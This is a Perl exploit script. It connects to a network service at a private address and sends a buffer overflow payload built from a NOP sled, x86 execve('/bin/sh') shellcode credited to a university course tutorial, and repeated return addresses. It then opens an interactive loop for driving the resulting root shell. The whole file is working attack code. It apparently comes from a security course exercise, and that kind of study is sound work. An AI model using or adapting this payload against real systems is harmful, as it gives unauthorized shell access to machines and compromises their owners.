#!/usr/bin/perl
#tcpclient.pl

use IO::Socket;

$socket = new IO::Socket::INET (
                                  PeerAddr  => '10.10.10.11',
                                  PeerPort  =>  7778,
                                  Proto => 'tcp',
                               )                
or die "Couldn't connect to Server\n";
	
	#Code from tutorial. http://www.cs.toronto.edu/~arnold/347/17f/lectures/smashStack/notes/shellcode.txt

	my $base=
	  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
	  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
	  "\x80\xe8\xdc\xff\xff\xff/bin/sh" .
	  "\x90\x90\x90"; # extended to 3*16 bytes

	my $nops= "\x90" x 16;

	my $getRootShell= ($nops x 61) . "\x90\x90\x90\x90" . ($base) . ("\xf0\xf6\xff\xbf" x 9) . 
"\n";

	$socket->recv($recv_data,1024);
	print "RECIEVED: $recv_data"; 

	$socket->send($getRootShell);

while (1) {
	
	$socket->recv($recv_data,1024);
	print "RECIEVED: $recv_data"; 
        print "\nSEND(TYPE quit to Quit):";
        
        $send_data = <STDIN>;
        $tmp=$send_data;
	chop($tmp); # get rid of new line
              
        
        if ($tmp ne 'quit') {
	        $socket->send($send_data);
        }    else {
	        $socket->send($send_data);
            	close $socket;
            	last;
        }
}    
    
